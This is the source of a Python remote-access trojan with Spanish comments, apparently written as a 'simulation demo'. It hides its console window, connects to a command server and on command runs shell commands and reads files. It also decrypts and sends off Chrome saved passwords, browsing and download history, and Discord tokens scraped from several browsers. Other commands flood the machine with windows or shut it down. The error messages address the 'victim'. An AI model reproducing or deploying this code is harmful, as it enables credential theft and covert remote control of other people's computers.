import os #Importa la librería de acceso al sistema operativo
import re #Importamos la librería de parsing de mensajes
import sys #Importamos la librería de acceso al sistema
import json #Importamos la librería de lectura y parsing JSON
import ctypes #Importamos la librería de contacto con OS
import base64 #Importamos la librería de conversión a base 64
import socket #Importamos la librería de red
import sqlite3 #Importamos la librería de cliente SQL
from threading import Thread #Importamos la librería de multitarea
try: import win32crypt #INTENTAMOS importar la librería EXTERNA de win crypt
except: pass
try: from Crypto.Cipher import AES #INTENTAMOS importarla librería EXTERNA de criptografía
except: pass

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),6) #Ejecutamos este código para minimizar la ventana

ip = "127.0.0.1" #definimos la IP a la que nos vamos a conectar (la dirección de la botnet)
port = 777 #definimos el puerto de la conexión de la botnet (el puerto de listening de la botnet)
separator_token = "<SEP>" #definimos un separador de paquetes (split)

s = socket.socket() #creamos el socket de conexión
s.connect((ip, port)) #nos conectamos a la dirección
print("H A C K E D")  #imprimimos la confirmación (el usuario nunca debería verlo idealmente, pero esto es una demo de simulación)
name = socket.gethostname() #creamos una variable con el nombre del equipo (nosotros no la usaremos, sin embargo, podríamos hacerlo para enviar el nombre junto a la dirección y que así, desde el admin pueda listar mediante nombres)

def get_encryption_key(): #Definimos la función que buscará la llave de encriptacion
    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome", "User Data", "Local State") #Tomará el path correcto de nuestro equipo a "Local State"
    with open(local_state_path, "r", encoding="utf-8") as f: #Tratará de Abrir dicho path en modo lectura
        local_state = f.read() #Leerá el Local State
        local_state = json.loads(local_state) #Lo pasará por formato JSON para encontrar el contenido por claves
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) #Ejecutamos un "decode" con la llave obtenida del JSON
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] #Tratamos de ejecutar la función de CryptUnprotectData de la libreria Win32

def decrypt_password(password): #Definimos la función de desencriptado (solo funcionará con las librerías externas)
    try:
        iv = password[3:15] #Tomamos formato de obtención
        password = password[15:] #Tomamos formato de procesamiento de la contraseña
        cipher = AES.new(get_encryption_key(), AES.MODE_GCM, iv) #Llamamoos a la librería de Cipher con los valores anteriores
        return str(cipher.decrypt(password)[:-16].decode()) #Buscaremos devolver la contraseña con el resultado pasado por "Decrypt"
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) #Si la contraseña no se pudo obtener, aplicar win32crypt para devolver hash
        except: return str(password) #Si tampoco se pudo, devolver hash directo
        
def getsql(fields,path,file,query): #Definimos la función "getsql"
    connection = sqlite3.connect(path + file) #Definimos la variable "connection" con la conexión local SQL al archivo recivido
    with connection: #Hacemos un loop con la conexión
        cursor = connection.cursor() #Definimos un cursor inicial para preparar la consulta
        v = cursor.execute(query) #Ejecutamos la consulta recibida mediante parámetro
        formt = "" #Generamos un texto en blanco para autorellenarlo con la siguiente consulta
        for row in cursor.fetchall(): #Hacemos un for loop por cada registro
            if (fields[2] == "Contraseña"): pscheck = str(decrypt_password(row[2])) #Verifica si el campo que ha recibido es una contraseña
            else: pscheck = str(row[2]) #En caso de que no, devuelve el valor original
            formt = formt+"\n===============================================================\n"+fields[0]+": "+row[0] #Imprimimos los 3 campos recibidos de la funcion getsql()
            formt = formt+"\n"+fields[1]+": "+str(row[1]) 
            formt = formt+"\n"+fields[2]+": "+str(pscheck)
        cursor.close() #Cerramos el cursor
        return str(formt) #Devolvemos el resultado del autogenerado

def browserminer(mine): #Definimos la función "browserminer"
    path = "" #Definimos un path temporalmente vacio
    if (os.name == "posix") and (sys.platform == "darwin"): return(error(5)) #Si el usuario utiliza plataforma darwin con nombre serial posix (confirmación de mac) devolvemos el error 5 (definido más adelante)
    if (os.name == "nt"): #si el usuario utiliza NT (win), definir la variable en APPDATA
        path = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\' #definimos la ruta en appdata para la ruta de chrome
    elif (os.name == "posix"): #si el usuario utiliza posix (linux distro), modificaremos la ruta 
        if sys.platform == "darwin": path += '/Library/Application Support/Google/Chrome/Default/' #si es plataforma darwin, probaremos esta ruta
        else: path += '/.config/google-chrome/Default/' #en caso de excepción, probaremos a añadir otra ruta
    if (not os.path.isdir(path)): return(error(4)) #si la condición se cumple, el usuario no tiene chrome (o utiliza una custom distro / path)
    try: #definimos un try
        value = None #creamos temporalmente value
        if (mine == "hlogs"): value = getsql(["Link","Usuario","Contraseña"],path,"Login Data","SELECT origin_url, username_value, password_value FROM logins") #si recibimos el argumento "hlogs" enviaremos el archivo "Login data" con la tabla "Logins" a la función "GetSQL"
        if (mine == "hlink"): value = getsql(["Titulo","Hora","Link"],path,"History","SELECT title,datetime(last_visit_time/1000000+(strftime('%s','1601-01-01')),'unixepoch','localtime'),url FROM urls LIMIT 100") #si recibimos el argumento "hlink" enviaremos el archivo "History" con la tabla "urls" a la función "GetSQL"
        if (mine == "hdwnl"): value = getsql(["Ruta","Web","Fuente"],path,"History","SELECT current_path, tab_referrer_url, tab_url FROM downloads") #si recibimos el argumento "hdwnl" enviaremos el archivo "History" con la tabla "downloads" a la función "GetSQL"
        return str(value).replace("\\","").replace("', '","") #Devuelve los datos de la respuesta por "GetSQL" en forma de String (texto parseado)
    except sqlite3.OperationalError as e: #define algunos errores por parte de las funciones SQL
        if (str(e) == 'database is locked'): return(error(1)) #definimos algunos errores 
        elif (str(e) == 'no such table: logins'): return(error(2)) #definimos algunos errores
        elif (str(e) == 'unable to open database file'): return(error(3)) #definimos algunos errores

def error(i): #definimos la funcion de "error" para printear las excepciones (aunque el usuario no debería verlas xd)
    if (i == 1): return "[!] La victima tiene abierto Chrome, espera a que lo cierre [!]" #mensaje de ayuda 1
    if (i == 2): return "[!] La victima ha protegido su Base de datos, abortando [!]" #mensaje de ayuda 2
    if (i == 3): return "[!] La victima ha protegido su Chrome path, abortando [!]" #mensaje de ayuda 3
    if (i == 4): return "[!] La victima ni siquiera tiene Chrome, abortando [!]" #mensaje de ayuda 4
    if (i == 5): return "[!] La victima utiliza MAC OS, abortando [!]" #mensaje de ayuda 5
    if (i == 6): return "[!] La victima no tiene discord en el navegador, abortando [!]" #mensaje de ayuda 6

def tokenbrute(path): #definimos la función "tokenbrute"
    path += '\\Local Storage\\leveldb' #definimos un path de sistema al que añadiremos el recivido mediante argumento
    tokens = [] #definimos un array vacio
    for file_name in os.listdir(path): #creamos un bucle de muestreo de cada uno de los archivos de la ruta
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): #definimos una condición que busque archivos sin extensión log y ldb
            continue #descartamos
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: #listamos las lineas del archivo
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'): #filtramos el texto
                for token in re.findall(regex, line): #buscamos entre todas las lineas del archivo donde se cumpla la condición "re"
                    tokens.append(token) #añadimos la token potencial
    return tokens #devolvemos la posible token

def discordsteal(): #creamos la función discordsteal
    local = os.getenv('LOCALAPPDATA') #definimos la ruta "localappdata" en el sistema
    roaming = os.getenv('APPDATA') #definimos la ruta "roaming" en el sistema
    paths = { 
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'} #seleccionamos posibles path
    message = "" #definimos la variable vacia
    for platform, path in paths.items(): #listamos entre las posibles rutas
        if not os.path.exists(path): continue #filtramos rutas existentes
        message += "**"+platform+"**" #definimos potencial 
        tokens = tokenbrute(path) #llamamos a la función "tokenbrute" para intentar obtener resultados del archivois
        if len(tokens) > 0: #si devuelve algo, llamar al loop
            for token in tokens: message += f'{token}\n' #filtrar por el loop para intentar obtener la token
        else: return (error(6)) #devolver error 6 sino se encuentra nada
    headers = { 'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'} #definimos los headers default
    payload = json.dumps({'content': message}) #utilizamos lector JSON para leer el contenido
    parsed = payload.split("Google Chrome")[1] #filtramos porel mensaje recivido del JSON dump
    parsed = parsed.replace("**","").replace('\\n"}',"") #filtramos la token
    return str(parsed) #devolvemos la token

def runcmd(command): #definimos la función "runcmd" con un argumento
    command = command.replace("runcmd ","") #obtenemos el argumento
    return str(os.popen(command).read()) #ejecutamos un comando en el sistema operativo devolviendo la respuesta

def sender(text): #definimos la función "sender" con un argumento
    s.send(text.encode()) #enviamos de vuelta a la botnet el mensaje codificado

def splashweb(web): #definimos la función "splashweb" con un argumento (windows)
    web = web.replace("splash ","") #recibimos la URL 
    if ("http" or "https" not in str(web)): web = "http://"+web #añadimos protocolo HTTP // HTTPS en caso de no haber
    os.system("start "+str(web)) #ejecutamos la apertura del URL
    return "operacion completada"

def script(): #definimos la función "script" sin argumentos
    while True: #creamos un bucle sin fin
        os.system("start echo Este PC va a colapsar :D") #saturará el equipo mediante aperturas de terminal
        os.system("https://google.com") #saturará el equipo mediante apertura de procesos de navegador
        return "he fxcked up"

def spy(path): #definimos la función "spy" con un argumento
    root = str(os.getcwd()).replace("'","") #definimos una variable con la ruta actual
    path = path.replace("fspy ","") #definimos el path actual en función del recibido mediante el argumento
    if (path == "" or path == " "): path = "." #definimos la ruta relativa
    fls = os.listdir(str(path)) #listamos el contenido del directorio
    array = [] #creamos un array vacio (para depurar respuestas) (aunque tambien podriamos haber utilizado splits y replaces)
    for fl in fls: #creamos un simple bucle para listar los elementos del array
        array.append(root+"\\"+str(fl)) #introducimos los elementos del array en otro array (secundario)
    return str(array) #devolvemos el nuevo array

def readfile(path): #definimos la función "readfile" con un argumento
    path = path.replace("fread ","") #filtramos la ruta
    content = open(path, "r").read() #abrimos el archivo recibido
    return(content) #devolvemos el contenido

def listen_for_messages(): #definimos una función de escucha de mensajes que funcione en segundo plano
    while True: #ejecutamos un bucle infinito
        message = s.recv(1024).decode() #creamos una variable con el contenido del paquete recivido
        if ("runcmd " in message): sender(runcmd(message)) #llevamos las salidas de los comandos a sus correspondientes funciones pasánsolos siempre por la función "sender" para enviar de vuelta el mensaje a la botnet
        if ("splash " in message): sender(splashweb(message))
        if ("fspy " in message): sender(spy(message))
        if ("fread " in message): sender(readfile(message))
        message = message.replace(" ","")
        if (message == "hlogs"): sender(browserminer("hlogs"))
        if (message == "hlink"): sender(browserminer("hlink"))
        if (message == "hdwnl"): sender(browserminer("hdwnl"))
        if (message == "script"): sender(script())
        if (message == "file"): sender()
        if (message == "discordsteal"): sender(discordsteal())
        if (message == "shutdown"): os.system("shutdown /s /t 1")

t = Thread(target=listen_for_messages) #creamos un thread llamando a la escucha de mensajes (proceso de segundo plano)
t.daemon = True #definimos que siempre corra en background
t.start() #iniciamos el thread (ahora tendremos el proceso de escucha en segundo plano mientras nosotros escribimos en el proceso principal)

while True: pass #creamos el proceso infinito

s.close() #cerramos la conexión
